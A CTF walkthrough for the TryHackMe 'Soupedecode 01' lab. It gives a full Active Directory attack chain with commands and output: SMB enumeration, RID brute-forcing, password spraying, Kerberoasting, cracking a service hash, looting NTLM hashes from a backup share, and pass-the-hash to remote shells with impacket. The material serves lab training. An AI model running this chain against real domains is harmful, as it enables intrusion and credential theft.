---
title: 'TryHackMe: Soupedecode 01 CTF Walkthrough'
author: 0xcracker
categories: [TryHackMe]
tags: [windows, rustscan, SMB, enum4linux, nxc, netexec, smbclient, impacket, impacket-smbclient, impacket-smbexec, impacket-psexec, impacket-GetUserSPNs, john, hashcat, rid-brute, Password Spraying, Hash Spraying, crackmapexec, Kerberoasting, kerbrute, kerberoast, SPN, TGS, Kerberoastable, AS-REP Roasting, AD, DC, Active Directory, pass-the-hash, RCE]
render_with_liquid: true
img_path: /images/TryHackMe/Soupedecode01
image:
  path: /images/TryHackMe/Soupedecode01/room_image.webp
---

<a href="https://tryhackme.com/room/soupedecode01" style="display: flex; align-items: center; background-color: #333; padding: 10px; border-radius: 5px; box-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3); color: #a1a1a1ff; text-decoration: none;">            TryHackMe | Soupedecode 01 CTF Challenge
  <img src="https://tryhackme.com/r/favicon.png" alt="icon" style="width: 48px; height: 48px; margin-right: 10px;">
  <span style="font-size: 16px;"></span>
</a>

🧰 Writeup Overview

This writeup details the step-by-step exploitation of an Active Directory(`AD`) environment vulnerable to `Kerberos attacks`, with a focus on `AS-REP Roasting`. It covers the initial reconnaissance identifying open `AD`-related services like `Kerberos`, `LDAP`, and `SMB`. Using these, the attacker extracts encrypted ticket hashes from service accounts without pre-authentication, then cracks them offline to reveal passwords. Finally, the writeup demonstrates post-exploitation techniques including `SMB` access and lateral movement, highlighting common weaknesses in `AD` setups and how to detect and exploit them.

## Reconnaissance

### Rustscan 

```sh
rustscan -a 10.10.150.50 — range 1–65535
```

![](/images/TryHackMe/Soupedecode01/ports.png)

---

```sh
rustscan -a 10.10.150.50 -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49664,49667,49675,49721,49794 -- -Pn -A -n -sCV -T4
```

**Summary of scanning**
```console
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-11 04:18:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? 
464/tcp   open  kpasswd5?     
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_ssl-date: 2025-08-11T04:20:17+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Issuer: commonName=DC01.SOUPEDECODE.LOCAL
| Not valid before: 2025-06-17T21:35:42
|_Not valid after:  2025-12-17T21:35:42
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49721/tcp open  msrpc         Microsoft Windows RPC
49794/tcp open  msrpc         Microsoft Windows RPC

Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Since we are dealing with a Domain Controller, let's add **hostname** `DC01.SOUPEDECODE.LOCAL` & **domain name** `SOUPEDECODE.LOCAL` into /etc/hosts:

```
10.10.150.50    DC01.SOUPEDECODE.LOCAL    SOUPEDECODE.LOCAL
```
{: file="/etc/hosts" }

### Enumerating SMB Shares

#### null authentication
Let's see if we can list the shares using null authentication

#### option |
Using [enum4linux](https://www.kali.org/tools/enum4linux/)

```sh
enum4linux -U -S SOUPEDECODE.LOCAL
```
![](/images/TryHackMe/Soupedecode01/enum4linux1.png)

---

#### option ||
Using [nxc](https://linuxcommandlibrary.com/man/nxc)( [netexec](https://www.netexec.wiki/) )

```sh
nxc smb DC01.SOUPEDECODE.LOCAL -u '' -p '' --shares
```
As you see there is `Windows Server 2022`
```sh
SMB         10.10.150.50    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.150.50    445    DC01             [-] SOUPEDECODE.LOCAL\: STATUS_ACCESS_DENIED 
SMB         10.10.150.50    445    DC01             [-] Error enumerating shares: Error occurs while reading from remote(104)
```

#### guest authentication
Let's list the shares using `guest` authentication without password

#### option |
Using [smbclient](https://tools.thehacker.recipes/impacket/examples/smbclient.py) But this option doesn't show permissions
```sh
smbclient -L //SOUPEDECODE.LOCAL -U guest
```

You can use `guest%\n` instead `guest` to connect directly

---

```sh
Password for [WORKGROUP\guest]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	Users           Disk      
```

#### option ||
Using `nxc`

```sh
nxc smb DC01.SOUPEDECODE.LOCAL -u 'guest' -p '' --shares
```

The `guest` user is allowed and grants us read access to the `IPC$` share.

```sh
SMB         10.10.150.50    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.150.50    445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
SMB         10.10.150.50    445    DC01             [*] Enumerated shares
SMB         10.10.150.50    445    DC01             Share           Permissions     Remark
SMB         10.10.150.50    445    DC01             -----           -----------     ------
SMB         10.10.150.50    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.150.50    445    DC01             backup                          
SMB         10.10.150.50    445    DC01             C$                              Default share
SMB         10.10.150.50    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.150.50    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.150.50    445    DC01             SYSVOL                          Logon server share 
SMB         10.10.150.50    445    DC01             Users         
```

---

### Discover Usernames

#### option |

```sh
kerbrute userenum -d SOUPEDECODE.LOCAL /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --dc DC01.SOUPEDECODE.LOCAL
```
{: .wrap }

But sadly this option takes a lot of time

![](/images/TryHackMe/Soupedecode01/kerbrute.png)

---

#### option ||
We can Leveraging our access to the `IPC$` share, to perform a `RID brute-force` attack against a domain controller `DC01.SOUPEDECODE.LOCAL` with the `guest` account to enumerate domain users.
```sh
nxc smb DC01.SOUPEDECODE.LOCAL -u 'guest' -p '' --rid-brute 2500
```

```sh
SMB         10.10.150.50    445    DC01             1416: SOUPEDECODE\mpeter317 (SidTypeUser)
SMB         10.10.150.50    445    DC01             1417: SOUPEDECODE\bpenny318 (SidTypeUser)
...
SMB         10.10.150.50    445    DC01             1418: SOUPEDECODE\fian319 (SidTypeUser)
SMB         10.10.150.50    445    DC01             1419: SOUPEDECODE\atara320 (SidTypeUser)
...
SMB         10.10.150.50    445    DC01             1420: SOUPEDECODE\vnoah321 (SidTypeUser)
SMB         10.10.150.50    445    DC01             1421: SOUPEDECODE\prachel322 (SidTypeUser)
...
```

Extract usernames from the output (removing domain prefixes and extra info), and saves them into `rids.txt`
```sh
nxc smb DC01.SOUPEDECODE.LOCAL -u 'guest' -p '' --rid-brute 2500 | cut -d '\' -f 2 | cut -d ' ' -f 1 > rids.txt
```
{: .wrap }

---

## User Flag

### Password Spraying

Using [ASREPRosting](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.html) and spraying the common password yielded no results.
Spraying "username=password" succeeded, revealing valid credentials for user `ybob317`

#### option | nxc
```sh
nxc smb DC01.SOUPEDECODE.LOCAL -u rids.txt -p rids.txt --no-bruteforce --continue-on-success
```

![](/images/TryHackMe/Soupedecode01/ybob.png)

---

#### option || crackmapexec
same nxc
```sh
crackmapexec smb DC01.SOUPEDECODE.LOCAL -u rids.txt -p rids.txt --no-bruteforce --continue-on-success
```

---
 
#### option ||| kerbrute

```sh
kerbrute passwordspray --user-as-pass -d SOUPEDECODE.LOCAL --dc DC01.SOUPEDECODE.LOCAL rids.txt -v
```

---

### Authentication with SMB

```sh
nxc smb SOUPEDECODE.LOCAL -u ybob317 -p ybob317 --shares
```

The valid `ybob317` credentials worked, showing read access to key shares including `NETLOGON`, `SYSVOL`, and `Users`, which may store sensitive files.

```sh
SMB         10.10.150.50    445    DC01             Share           Permissions     Remark
SMB         10.10.150.50    445    DC01             -----           -----------     ------
SMB         10.10.150.50    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.150.50    445    DC01             backup                          
SMB         10.10.150.50    445    DC01             C$                              Default share
SMB         10.10.150.50    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.150.50    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.150.50    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.150.50    445    DC01             Users           READ 
```

Connected to SMB as `ybob317`, accessed the `Users` share, navigated to the user’s Desktop, and retrieved `user.txt`.

```sh
impacket-smbclient 'SOUPEDECODE.LOCAL/ybob317:ybob317@SOUPEDECODE.LOCAL'
```

![](/images/TryHackMe/Soupedecode01/user-flag.png)

---

## Root Flag

### [Kerberoasting](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/kerberoasting/)

You can check here About [Cracking Kerberos TGS Tickets](https://adsecurity.org/?p=2293) & [SPN](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names) & [Kerberos Authentication](https://www.vaadata.com/blog/what-is-kerberos-kerberos-authentication-explained/)

Since we have a valid domain credentials, we check for `Kerberoastable` accounts using `GetUserSPNs`

so we request a Kerberos service ticket for one or more of these identified accounts from the ticket granting service `TGS` from `SPN` using `GetUserSPNs`

```sh
impacket-GetUserSPNs 'SOUPEDECODE.LOCAL/ybob317:ybob317' -request -usersfile rids.txt -dc-ip SOUPEDECODE.LOCAL -outputfile hashes-kerberoastables.txt
```
{: .wrap }

OR the best use this

```sh
impacket-GetUserSPNs 'SOUPEDECODE.LOCAL/ybob317:ybob317' -request -dc-ip SOUPEDECODE.LOCAL -outputfile hashes-kerberoastables.txt
```
{: .wrap }

![](/images/TryHackMe/Soupedecode01/GetUserSPNs.png)

---

```sh
cat hashes-kerberoastables.txt | grep file_svc > file_svc.tgs
```

```sh
head -c 30 file_svc.tgs
```

Now Using John the Ripper OR Hashcat with the RockYou wordlist to crack the `Kerberos TGS ticket` hash, successfully revealing the password

![](/images/TryHackMe/Soupedecode01/pass.png)

---

### Accessing the Backup Share

With the `file_svc` account, we enumerate SMB shares again and discover that we now have read access to the `backup` share.

```sh
nxc smb SOUPEDECODE.LOCAL -u 'file_svc' -p 'P******!!' --shares
```


![](/images/TryHackMe/Soupedecode01/file_svc.png)

---

Extact `backup_extract.txt`

```sh
smbclient //$(IP)/backup -U 'SOUPEDECODE.LOCAL\file_svc'
```

OR

```sh
impacket-smbclient 'SOUPEDECODE.LOCAL/file_svc:Password123!!@dc01.soupedecode.local'
```
{: .wrap }

```sh
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use backup
# ls
drw-rw-rw-          0  Mon Jun 17 17:41:17 2024 .
drw-rw-rw-          0  Fri Jul 25 17:51:20 2025 ..
-rw-rw-rw-        892  Mon Jun 17 17:41:23 2024 backup_extract.txt
# get backup_extract.txt
```

The file contains a list of account names and their corresponding `NTLM hashes`.

```sh
cat backup_extract.txt                                                                                     
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```

Let’s parse the file to separate list for accounts and NTLM hashes.


```sh
cat backup_extract.txt | cut -d ':' -f 1 > machines.txt                                                    
```

```sh
cat backup_extract.txt | cut -d ':' -f 4 | awk '{print "00000000000000000000000000000000:"$1}' > hashes.txt
```

```sh
cat backup_extract.txt | cut -d ':' -f 4 > hashes.txt 
```

![](/images/TryHackMe/Soupedecode01/cut-awk.png)

---

### Hash Spraying
We discovered that the hash for the `FileServer$` account is valid and grants us access.

```sh
nxc smb SOUPEDECODE.LOCAL -u machines.txt -H hashes.txt --no-bruteforce     
```

```sh
SMB         10.10.150.50    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.150.50    445    DC01             [-] SOUPEDECODE.LOCAL\WebServer$:c47b45f5d4df5a494bd19f13e14f7902 STATUS_LOGON_FAILURE
SMB         10.10.150.50    445    DC01             [-] SOUPEDECODE.LOCAL\DatabaseServer$:406b424c7b483a42458bf6f545c936f7 STATUS_LOGON_FAILURE
SMB         10.10.150.50    445    DC01             [-] SOUPEDECODE.LOCAL\CitrixServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE
SMB         10.10.150.50    445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```


### Administrator Access

The `FileServer$` account hash provided administrator-level access to over `DC`, Notice the tag `(Pwn3d!)`that indicates what I'm saying.
With this privilege, we can either execute commands remotely via impacket-psexec `RCE` or browse administrative shares like `C$`.

```sh
nxc smb SOUPEDECODE.LOCAL -u FileServer$ -H e41da7e79a4c76dbd9cf79d1cb325559 --shares 
```

![](/images/TryHackMe/Soupedecode01/FileServer.png)

---

#### option | RCE impacket-psexec

```sh
impacket-psexec 'FileServer$@SOUPEDECODE.LOCAL' -hashes ':e41da7e79a4c76dbd9cf79d1cb325559'
```
{: .wrap }

![](/images/TryHackMe/Soupedecode01/RCE.png)

---

#### option || RCE impacket-smbexec

```sh
impacket-smbexec -hashes :e41da7e79a4c76dbd9cf79d1cb325559 'SOUPEDECODE.LOCAL/FileServer$@dc01.soupedecode.local'
```

```sh
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>[-] 
```

#### option ||| C$ share 

Alternatively, browse administrative shares via `SMB`  like `C$` then get the flag directly:

```sh
impacket-smbclient -hashes :e41da7e79a4c76dbd9cf79d1cb325559 'SOUPEDECODE.LOCAL/FileServer$@dc01.soupedecode.local'
```

![](/images/TryHackMe/Soupedecode01/root-smb.png)

<div style="text-align: center;">
<img src="/gifs/crazy.gif" alt="GIF" style="max-width:2400px; height:450px; border-radius:8px;">
</div>

---

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>
